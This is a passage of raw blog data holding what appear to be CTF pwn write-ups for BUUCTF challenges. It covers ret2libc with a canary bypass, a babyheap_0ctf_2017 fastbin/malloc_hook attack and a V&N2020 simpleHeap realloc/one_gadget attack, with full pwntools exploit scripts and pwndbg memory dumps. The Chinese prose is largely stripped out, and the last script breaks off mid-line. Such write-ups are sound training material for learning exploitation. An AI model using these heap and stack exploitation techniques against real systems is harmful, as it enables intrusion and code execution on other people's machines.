class=\"string\">b'A'</span>*<span class=\"number\">0x18</span>+p64(canary)+<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class=\"line\">ru(<span class=\"string\">\"Pull up your sword and tell me u story!\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">puts = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">pld = <span class=\"string\">b'A'</span>*<span class=\"number\">0x18</span>+p64(canary)+<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>+p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class=\"line\">ru(<span class=\"string\">\"Pull up your sword and tell me u story!\\n\"</span>)</span><br><span class=\"line\">sl(pld)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"BUU(PWN2)---","url":"https://pz1o.top/2021/02/15/BUU-PWN3-/","content":"<h2 id=\"babyheap-0ctf-2017malloc-hook-onegadget\"><a href=\"#babyheap-0ctf-2017malloc-hook-onegadget\" class=\"headerlink\" title=\"babyheap_0ctf_2017malloc_hook+onegadget\"></a>babyheap_0ctf_2017malloc_hook+onegadget</h2><p></p>\n<ul>\n<li>Allocate index</li>\n<li>Fill index </li>\n<li>Free index </li>\n<li>Dump index </li>\n</ul>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223160414468.png\" alt=\"image-20210223160414468\"></p>\n<p>add</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230306738.png\" alt=\"image-20210223230306738\"></p>\n<blockquote>\n<p>C  <strong>void *calloc(size_t nitems, size_t size)</strong> <strong>malloc</strong>  <strong>calloc</strong> malloc  calloc </p>\n</blockquote>\n<p>fill</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230325725.png\" alt=\"image-20210223230325725\"></p>\n<blockquote>\n<p>size</p>\n</blockquote>\n<p>free</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230340158.png\" alt=\"image-20210223230340158\"></p>\n<p>print</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210223230355914.png\" alt=\"image-20210223230355914\"></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li></li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>libcone_gadget</p>\n<ol>\n<li>libcunsorted bin fdbkunsorted bin chunkchunkfdbk</li>\n<li>4fastchunk1smallchunkfastchunkfdsmallchunkfastchunksmallchunksmallchunkfreeunsorted binfdbklibc</li>\n<li>one_gadget,malloc_hookone_gadget,chunksize7f,7ffastchunkfdchunk</li>\n</ol>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>libcunsorted bin</li>\n<li>malloc_hookone_gadgetshell</li>\n</ol>\n<blockquote>\n<p></p>\n<p>1.unsorted binfdbkmain_arenalibc</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224003723169.png\" alt=\"image-20210224003723169\"></p>\n<p>fdbk</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224004547238.png\" alt=\"image-20210224004547238\"></p>\n<p>pwndbgvmmap</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224004734621.png\" alt=\"image-20210224004734621\"></p>\n<p>libcfd</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;0x7efcea106b78-0x7efce9d42000&#x3D;0x3c4b78</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>2.<strong>malloc_hook  libc  malloc </strong> malloc_hook  getshell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;void *(*hook) (size_t, const void *)</span><br><span class=\"line\">  &#x3D; atomic_forced_read (__malloc_hook);</span><br><span class=\"line\">if (__builtin_expect (hook !&#x3D; NULL, 0))</span><br><span class=\"line\">  return (*hook)(bytes, RETURN_ADDRESS (0));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;pwndbg&gt; x&#x2F;32gx (long long)(&amp;main_arena)-0x40</span><br><span class=\"line\">&gt;0x7f92af6c2ae0 &lt;_IO_wide_data_0+288&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2af0 &lt;_IO_wide_data_0+304&gt;:\t0x00007f92af6c1260\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b00 &lt;__memalign_hook&gt;:\t0x00007f92af383ea0\t0x00007f92af383a70</span><br><span class=\"line\">&gt;0x7f92af6c2b10 &lt;__malloc_hook&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b20 &lt;main_arena&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b50 &lt;main_arena+48&gt;:\t0x00005594c5a61080\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">&gt;0x7f92af6c2b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00005594c5a611a0</span><br><span class=\"line\">&gt;0x7f92af6c2b80 &lt;main_arena+96&gt;:\t0x00005594c5a610f0\t0x00005594c5a610f0</span><br><span class=\"line\">&gt;0x7f92af6c2b90 &lt;main_arena+112&gt;:\t0x00005594c5a610f0\t0x00007f92af6c2b88</span><br><span class=\"line\">&gt;0x7f92af6c2ba0 &lt;main_arena+128&gt;:\t0x00007f92af6c2b88\t0x00007f92af6c2b98</span><br><span class=\"line\">&gt;0x7f92af6c2bb0 &lt;main_arena+144&gt;:\t0x00007f92af6c2b98\t0x00007f92af6c2ba8</span><br><span class=\"line\">&gt;0x7f92af6c2bc0 &lt;main_arena+160&gt;:\t0x00007f92af6c2ba8\t0x00007f92af6c2bb8</span><br><span class=\"line\">&gt;0x7f92af6c2bd0 &lt;main_arena+176&gt;:\t0x00007f92af6c2bb8\t0x00007f92af6c2bc8</span><br></pre></td></tr></table></figure>\n<p>libcmalloc_hook</p>\n<p>fastbin attackfdmalloc_hook7f7f&gt;71one_gadget</p>\n<p>one_gadget</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224145651167.png\" alt=\"image-20210224145651167\"></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = remote(\"node3.buuoj.cn\",26260)</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn23\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">allocate</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Size: '</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fill</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'2'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Index: '</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tru(<span class=\"string\">'Size: '</span>)</span><br><span class=\"line\">\tsl(str(len(content)))</span><br><span class=\"line\">\tru(<span class=\"string\">'Content: '</span>)</span><br><span class=\"line\">\ts(content)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Index: '</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">'Command: '</span>)</span><br><span class=\"line\">\tsl(<span class=\"string\">'4'</span>)</span><br><span class=\"line\">\tru(<span class=\"string\">'Index: '</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tp.recvline()</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p.recvline()</span><br><span class=\"line\"> </span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">allocate(<span class=\"number\">0x80</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">payload += p8(<span class=\"number\">0x80</span>)</span><br><span class=\"line\">fill(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">fill(<span class=\"number\">1</span>,<span class=\"string\">'aaaa'</span>)</span><br><span class=\"line\">fill(<span class=\"number\">2</span>,<span class=\"string\">'bbbb'</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x91</span>)</span><br><span class=\"line\">fill(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x80</span>)<span class=\"comment\">#</span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">libc_base = u64(dump(<span class=\"number\">2</span>)[:<span class=\"number\">8</span>].strip().ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))<span class=\"number\">-0x3c4b78</span></span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">allocate(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">payload = p64(libc_base+<span class=\"number\">0x3c4aed</span>)</span><br><span class=\"line\">fill(<span class=\"number\">2</span>, payload)</span><br><span class=\"line\">allocate(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">allocate(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">payload = p8(<span class=\"number\">0</span>)*<span class=\"number\">3</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">payload += p64(libc_base+<span class=\"number\">0x4526a</span>)</span><br><span class=\"line\">fill(<span class=\"number\">6</span>, payload)</span><br><span class=\"line\">allocate(<span class=\"number\">255</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"V-amp-N2020--simpleHeap-realloc-onegadget\"><a href=\"#V-amp-N2020--simpleHeap-realloc-onegadget\" class=\"headerlink\" title=\"[V&amp;N2020 ]simpleHeap(realloc+onegadget)\"></a>[V&amp;N2020 ]simpleHeap(realloc+onegadget)</h2><p></p>\n<ol>\n<li>add</li>\n<li>edit</li>\n<li>show</li>\n<li>delete</li>\n</ol>\n<p>add</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155042717.png\" alt=\"image-20210224155042717\"></p>\n<p>edit</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155220384.png\" alt=\"image-20210224155220384\"></p>\n<p>show</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155623947.png\" alt=\"image-20210224155623947\"></p>\n<p>del</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210224155639109.png\" alt=\"image-20210224155639109\"></p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li></li>\n</ol>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>chunksizelibcunsorted binfd bk4chunksizeunsorted binfd bk</li>\n<li>onegadgetfastbin chunkfdmalloc_hookchunk</li>\n</ol>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>onegadgetrealloc</li>\n</ol>\n<blockquote>\n<p>onegadget</p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225152559448.png\" alt=\"image-20210225152559448\"></p>\n<p>0x4526a</p>\n<p>malloc_hookrealloc_hookmalloc_hookrealloc_hook,realloc_hookonegadget,</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;realloc &#x3D; libc_base + 0x846C0</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225153626853.png\" alt=\"image-20210225153626853\"></p>\n<p></p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210225154202313.png\" alt=\"image-20210225154202313\"></p>\n<p>30rsp+0x30</p>\n<p>reallocpush</p>\n<p>push,pushrsp</p>\n<p></p>\n<p></p>\n<p><strong>malloc&gt;malloc_hook&gt;malloc_hookrealloc+offset&gt;reallocrealloc_hook&gt;realloc_hookone_gadgetone_gadget</strong></p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">\"./libc-2.232.so\"</span>)</span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29222</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn24\",env =&#123;\"LD_PRELOAD\":\"./libc-2.232.so\"&#125;)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"size?\"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\"content:\"</span>)</span><br><span class=\"line\">\ts(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(idx,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"idx?\"</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tru(<span class=\"string\">\"content:\"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"idx?\"</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"choice: \"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">4</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"idx?\"</span>)</span><br><span class=\"line\">\tsl(str(idx))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Done!\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x68</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">payload = <span class=\"string\">'\\x00'</span>*<span class=\"number\">0x28</span> + <span class=\"string\">'\\xE1'</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x68</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">libc_base=uu64(r(<span class=\"number\">6</span>))<span class=\"number\">-0x3c4b78</span></span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">malloc_hook = libc_base + libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"malloc_hook\"</span>,malloc_hook)</span><br><span class=\"line\">realloc = libc_base + <span class=\"number\">0x846CC</span>    <span class=\"comment\">#</span></span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4526A</span></span><br><span class=\"line\">leak(<span class=\"string\">\"realloc\"</span>,realloc)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">'\\n'</span>) <span class=\"comment\">#4 -&gt;2</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(malloc_hook<span class=\"number\">-0x23</span>)+<span class=\"string\">'\\n'</span></span><br><span 